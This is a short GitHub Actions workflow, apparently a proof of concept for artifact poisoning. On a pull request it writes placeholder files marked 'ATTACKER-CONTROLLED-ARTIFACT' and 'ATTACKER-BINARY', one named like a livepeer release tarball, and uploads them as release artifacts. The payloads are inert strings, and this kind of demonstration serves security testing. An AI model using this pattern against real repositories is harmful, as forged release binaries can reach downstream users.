name: Build binaries

on:
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Forge artifacts
        run: |
          mkdir -p releases
          echo "ATTACKER-CONTROLLED-ARTIFACT" > releases/payload.txt
          echo "ATTACKER-BINARY" > releases/livepeer-lapi-linux-amd64.tar.gz
      - uses: actions/upload-artifact@v4
        with:
          name: release-artifacts
          path: releases/
